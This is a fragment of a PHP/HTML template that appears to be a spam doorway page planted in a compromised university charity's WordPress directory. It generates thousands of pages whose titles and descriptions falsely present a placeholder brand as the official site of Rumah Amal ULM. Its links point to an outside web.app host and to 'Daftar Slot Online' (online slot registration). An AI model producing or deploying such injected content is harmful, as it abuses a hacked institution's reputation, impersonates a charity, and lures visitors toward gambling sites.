...
$baseAuthor = $BRAND;
$URL  = "https://rumahamal.ulm.ac.id/wp-content/?ninja=$BRAND";
$PAGEURL = "https://rumahamal.ulm.ac.id/wp-content/?ninja=$BRAND";
$AMP = "https://jawajawajawa-a3c13.web.app/$BRAND/";
$DAFTAR = "https://jawajawajawa-a3c13.web.app/";
$BANNER = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRKfbko_4STXnANp7F_jPy-2vfWj8Fd-Bv8hCZZe7N-Qj17joYzCtzTz3lN&s=10";
...
if ($NUMLIST >= 1 && $NUMLIST <= 31134) {
    $TITLE = "$BRAND # Rumah Amal ULM ";
    $DESCRIPTION = "$BRAND adalah situs resmi Rumah Amal Universitas Lambung Mangkurat (ULM), yang didirikan untuk membantu mahasiswa yang mengalami kesulitan ekonomi agar dapat menyelesaikan pendidikan mereka tanpa terbebani masalah finansial. Rumah Amal ini bertujuan untuk mendukung mahasiswa kurang mampu dalam mencapai tujuan akademis mereka.
";
    $description = "$BRAND adalah situs resmi Rumah Amal Universitas Lambung Mangkurat (ULM), yang didirikan untuk membantu mahasiswa yang mengalami kesulitan ekonomi agar dapat menyelesaikan pendidikan mereka tanpa terbebani masalah finansial. Rumah Amal ini bertujuan untuk mendukung mahasiswa kurang mampu dalam mencapai tujuan akademis mereka.
";
}
...
<!doctype html>
  ...
  <small class="copyright__content"><a href="<?php echo $URL ?>" title="Daftar Slot Online">Copyright ©2025 <?php echo $BRAND ?></a></small>
      </footer>
